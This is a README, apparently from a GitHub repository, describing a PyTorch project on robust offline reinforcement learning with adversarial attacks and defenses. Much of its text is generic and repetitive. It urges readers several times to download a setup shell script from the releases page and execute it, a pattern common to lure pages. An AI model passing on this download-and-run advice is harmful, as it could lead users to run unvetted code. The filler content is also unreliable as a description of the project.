https://github.com/SceYanis/robust_offline_rl/releases

# Robust Offline RL: PyTorch Implementation of Robust Policy with Attacks & Defenses

![PyTorch](https://pytorch.org/assets/images/pytorch-logo.png)

Welcome to a PyTorch-based project that implements the ideas from Towards Robust Policy: Enhancing Offline Reinforcement Learning with Adversarial Attacks and Defenses. This repository focuses on building robust offline policies. It combines offline RL with adversarial testing and defenses to improve policy reliability in static data settings.

[![Releases](https://img.shields.io/github/v/release/SceYanis/robust_offline_rl?style=flat-square)](https://github.com/SceYanis/robust_offline_rl/releases)

If you want to grab the latest assets, visit the Releases page. The link above points to that page, and you can open it to see assets, notes, and the exact files you can download. For quick access, the same link is included again later in this README.

Table of Contents
- Overview
- Why robustness matters in offline RL
- Core ideas and guarantees
- Features
- Architecture and code structure
- Quick start
- Installation and dependencies
- Reproducing experiments
- Datasets used
- Evaluation metrics
- Attack types and defenses
- Hyperparameters and training details
- How the project is designed
- Testing and quality assurance
- Documentation and examples
- Roadmap and future work
- How to contribute
- Licensing
- Acknowledgments
- Frequently asked questions
- Releases and download guidance

Overview
This repository provides a PyTorch implementation of robust offline reinforcement learning. It extends offline RL with adversarial scenarios and defensive mechanisms. The aim is to produce policies that perform well not only on the training data but also under plausible perturbations and distribution shifts.

The project targets researchers and practitioners who want to explore robustness in offline settings. It favors clarity, reproducibility, and modular design. The code is organized to make it easy to run baselines, implement new attacks, and test new defenses.

Why robustness matters in offline RL
Offline RL uses a fixed dataset. It learns a policy from data collected by various policies. This setting can invite overfitting and exploitation of biased data patterns. A policy may perform well on the training data but fail in real use if the data slightly changes or if an attacker perturbs observations.

Robustness helps answer practical questions:
- How does a policy respond to small observer changes?
- Can an attacker degrade performance by altering inputs?
- Do defenses keep performance stable under data shifts?
- How can we design training methods that resist such perturbations?

By combining attacks and defenses in offline RL, we can study trade-offs and push the field toward reliable policies in real-world tasks.

Core ideas and guarantees
- Attacks on offline RL: We simulate adversarial conditions by perturbing observations, actions, or reward signals during evaluation. The goal is to reveal weaknesses in learned policies and to provide a benchmark for robustness.
- Defenses: We apply strategies that reduce sensitivity to perturbations. Techniques include robust loss functions, data augmentation, regularization, and training with adversarial examples.
- Evaluation: We measure robustness across several metrics. We compare policy performance under clean data, perturbed data, and unseen distributions.
- Guarantees: We aim for empirical robustness. While formal guarantees are challenging in RL, we seek consistent improvements in worst-case or near-worst-case scenarios.

Features
- PyTorch-based implementation with clean modules and tests
- Support for offline datasets and standard offline RL benchmarks
- Pluggable attack modules to simulate adversarial conditions
- Defenses integrated into the training loop
- Reproducible experiments with seeds and fixed configurations
- First-class logging and easy experiment replication
- Documentation and examples to guide new users

Architecture and code structure
- core/: Core RL algorithms implemented in PyTorch. This includes value networks, policy networks, and training loops for offline learning.
- attacks/: Adversarial attack modules. These perturb inputs or signals to test policy robustness.
- defenses/: Defensive strategies that improve robustness during training and evaluation.
- datasets/: Offline RL datasets and helpers for data handling, normalization, and scaling.
- evaluators/: Metrics, logging, and performance reporting tools.
- utils/: Utility functions, common utilities, and helpers for reproducibility.
- examples/: End-to-end examples showing how to train and test robustness on selected tasks.
- tests/: Unit and integration tests to ensure code quality.

Quick start
This section helps you get running quickly. The steps assume a clean Python environment with PyTorch installed.

- Clone the repository
  - git clone https://github.com/SceYanis/robust_offline_rl.git
- Create a Python virtual environment
  - python -m venv venv
  - source venv/bin/activate
- Install dependencies
  - pip install -r requirements.txt
- Run a sample experiment
  - python experiments/run_offline_robust_example.py --config configs/robust_example.yaml
- Check results
  - Look at logs in outputs/robust_example/ and inspect evaluation metrics

Note: The releases page contains assets that are handy for setup. From the Releases page, you may find a script to help you initialize environments and run experiments. The link above points to the releases page, and you can download the script from there. The same link is used again later in this document.

Installation and dependencies
- Python: 3.8–3.11 recommended
- PyTorch: 1.12 or newer
- NumPy, SciPy
- Gymnasium or gym for environments
- Stable baselines-like utilities for offline tasks
- Matplotlib or seaborn for plotting
- D4RL or similar datasets for offline benchmarks (optional but recommended)

Install guide:
- Create a fresh environment
  - conda create -n robust_offline_rl python=3.9
  - conda activate robust_offline_rl
- Install PyTorch
  - Follow the official instructions for your platform from pytorch.org
- Install project dependencies
  - pip install -r requirements.txt
- Install optional extras
  - pip install torch torchvision torchaudio
  - pip install gymnasium
  - pip install d4rl  # if you want standard offline datasets
- Validate installation
  - python -c "import torch; print(torch.__version__)"
  - python -c "import gymnasium; print(gymnasium.__version__)"
- If you run into issues, check the community wiki and the Releases page for prebuilt assets.

Reproducing experiments
The project supports reproducible experiments with fixed seeds and configuration files. Follow these steps:

- Choose a task and dataset
  - Start with a standard offline RL task, such as a D4RL-like dataset for a chosen environment.
- Prepare the dataset
  - Use the provided dataset scripts to normalize, filter, and prepare data for training.
- Configure the run
  - Copy a sample YAML config from configs/ into your working directory.
  - Adjust seed values, dataset paths, and any hyperparameters you want to explore.
- Run training
  - python experiments/run_offline_robust_experiment.py --config configs/robust.yaml
- Run evaluation
  - python experiments/evaluate.py --config configs/eval.yaml
- Log and analyze
  - Inspect the logs under outputs/ and use the included plotting utilities to compare results across runs.

Datasets used
- D4RL-style offline datasets (for standard benchmarks)
- Collected offline data from a variety of policies
- Synthetic datasets created to test perturbation resilience

Evaluation metrics
- Average return on clean data
- Performance under adversarial perturbations
- Worst-case or near-worst-case performance across perturbation settings
- Stability metrics across seeds and dataset splits
- Sample efficiency indicators when training with limited data
- Robustness gain from defenses (difference between with/without defenses)

Attack types and defenses
- Observation perturbations: Perturb the agent’s observations within a controlled budget to test sensitivity.
- Action perturbations: Introduce small noise to actions during evaluation to assess policy sturdiness.
- Reward perturbations: Adjust rewards to inspect the effect on value estimation.
- Data poisoning: Inject adversarial samples into training data to study effect on learning.
- Defenses: Adversarial training, regularization schemes, data augmentation, robust loss functions, and ensemble methods.

Hyperparameters and training details
- Learning rate schedulers
- Discount factor gamma
- Batch size and replay buffer size
- Perturbation budgets for attacks
- Number of attack steps for robust optimization
- Regularization coefficients for defenses
- Seed management for reproducibility

How the project is designed
- Modularity: Each component (attack, defense, agent) is a standalone module with clear interfaces.
- Reproducibility: Seeds, fixed configurations, and documented results.
- Extensibility: New attacks or defenses can plug into the existing training loop with minimal changes.
- Clarity: Code is documented. Functions have small responsibilities. Tests cover critical paths.
- Observability: Rich logging, including per-episode statistics and diagnostic plots.

Testing and quality assurance
- Unit tests for core modules
- Integration tests for training and evaluation loops
- Continuous integration checks on common platforms
- Static type checks to catch mismatches early
- Coverage reporting to guide improvements

Documentation and examples
- Detailed README with setup steps and usage examples
- API references for core components
- Tutorials that walk through:
  - Baseline offline RL with a standard dataset
  - Adding a simple adversarial attack
  - Enabling a basic defense
  - Extending with a new task
- Notebooks showing end-to-end runs and plots
- A glossary of terms used in robust offline RL

Roadmap and future work
- Extend to additional environments and datasets
- Explore more sophisticated attack strategies
- Develop new defense mechanisms with lower computational cost
- Improve evaluation under non-stationary data
- Add more visualization tools

How to contribute
- Report issues with clear reproduction steps
- Propose enhancements with a small, testable scope
- Follow the project’s coding style and tests
- Add tests for new features
- Update documentation when you change behavior

Licensing
- This project uses a permissive license suitable for research and education.
- Licensing details and attribution requirements are included in the LICENSE file.

Acknowledgments
- Thanks to the researchers who laid the foundation for robust policies in offline RL.
- Appreciation to contributors who helped shape the code base, tests, and documentation.

Frequently asked questions
- What is offline RL?
  - It learns from a fixed dataset. It does not interact with the environment during training.
- Why add adversarial tests?
  - To reveal weaknesses and guide the design of robust methods.
- How do I reproduce results?
  - Use the configuration files and the instructions in the Documentation section. See the Releases page for downloadable assets.
- Can I run this on custom data?
  - Yes. Provide your own dataset in the expected format and adjust the config accordingly.
- Is it ready for production?
  - It is research-oriented. It focuses on understanding robustness and guiding future work.

Releases and download guidance
From the Releases page, you can obtain assets and scripts to help you set up and run experiments. The link above points to the releases page for ease of access. If you want to download a setup script or a prebuilt artifact, head to the Releases section and grab the file named robust_offline_rl_setup.sh (as an example asset). After downloading, you can execute it to prepare your environment and run experiments that mirror the examples in this repository. The same link is provided again here for convenience: https://github.com/SceYanis/robust_offline_rl/releases

Notes about the downloads
- The releases page compiles artifacts that are tested with the project’s configurations.
- Each asset includes notes describing its purpose and how to use it.
- Always verify the integrity of downloaded assets against provided checksums when available.

Project philosophy
- Clarity: The code and docs aim to be easy to read and understand.
- Reproducibility: All steps are documented, and seeds are fixed where possible.
- Practicality: The focus is on methods you can actually run and test.
- Safety: The assets are designed to be safe to download from trusted sources and verified for integrity.

Community and contact
- We welcome contributions from researchers, students, and practitioners.
- You can open issues for feature requests, bug reports, or questions.
- You may also submit pull requests with clear descriptions and tests.

Code of conduct
- Be respectful in interactions.
- Share constructive feedback.
- Respect others’ work and credit contributors.

Acknowledging the project
- This project builds on concepts from robust policy work in offline reinforcement learning.
- It emphasizes practical tools for evaluating robustness and for implementing defenses.

Images and visuals
- The PyTorch logo signals the framework used for implementation.
- Diagrams of reinforcement learning workflows provide a visual guide to the training and evaluation cycles.
- Visuals help compare baselines, attacks, and defense methods across tasks.

Implementation notes
- The design favors a clean separation between data handling, model training, and evaluation.
- The attack modules are designed to be lightweight and easy to plug into the training loop.
- The defense modules focus on reducing overfitting and smoothing value estimates.
- The evaluation suite captures both nominal and robust performance.

Performance considerations
- Training with adversarial components adds overhead. You can trade off robustness level against training time by adjusting the number of attack steps and the strength of perturbations.
- For large datasets, consider using distributed training or mixed precision to speed up experiments.
- Use smaller environments and datasets for initial experiments, then scale up.

Common pitfalls
- Misaligned seeds causing varying results across runs. Set seeds consistently across modules.
- Missing dependencies or incompatible PyTorch versions. Confirm compatibility with your CUDA version.
- Overfitting to a single perturbation type. Use a diverse attack set to stress-test robustness.

Tips for success
- Start with a simple baseline offline RL run. Confirm you can reproduce published baselines before adding attacks.
- Add one attack type at a time. Observe its impact on performance.
- Introduce defenses gradually. Compare with the baseline to quantify gains.
- Save intermediate checkpoints. Use them to compare learning curves and robustness.

Keeping your workspace tidy
- Use a clean virtual environment for each experiment.
- Keep a directory for each task with logs, plots, and config files.
- Version control your configs and notes. It makes reproducing results easier.

Compatibility and portability
- The code is designed to work on common OSes: Linux and macOS, with Windows support depending on dependencies.
- The project relies on PyTorch and Gym-like interfaces. If you use a different framework, you can adapt adapters.
- Ensure you have a compatible CUDA driver for GPU acceleration if you plan to use GPUs.

Security considerations
- Run downloaded assets in a controlled environment.
- Verify checksums when provided.
- Review any scripts before executing them, especially those that modify your environment.

Documentation links and further reading
- Core README: This document you are reading now.
- API reference: Generated docs for modules like attacks, defenses, and evaluators.
- Tutorials: Step-by-step guides showing end-to-end experiments.
- External reading: References to the Towards Robust Policy paper and related work.

Social and community channels
- GitHub discussions for questions and ideas.
- Mailing lists or chat channels as announced in the repository.
- Contribution guidelines for code, tests, and docs.

Final notes
- This README captures the essence of robust offline RL in PyTorch, focusing on attacks and defenses.
- The releases page is your gateway to assets and setup scripts. Visit the page to download and run the recommended setup. The link is repeated here for convenience: https://github.com/SceYanis/robust_offline_rl/releases

Download and run reminder
- From the releases page, download robust_offline_rl_setup.sh (or a similarly named asset) and execute it to set up your environment and run a sample experiment. The link to the releases page is the same one you used earlier, and you will see asset names that match this description. For reference, the URL is https://github.com/SceYanis/robust_offline_rl/releases

Notes on usage
- Use the standard Python environment to run experiments.
- Adjust configurations for your hardware and data.
- Review logs and plots to understand robustness gains and failure cases.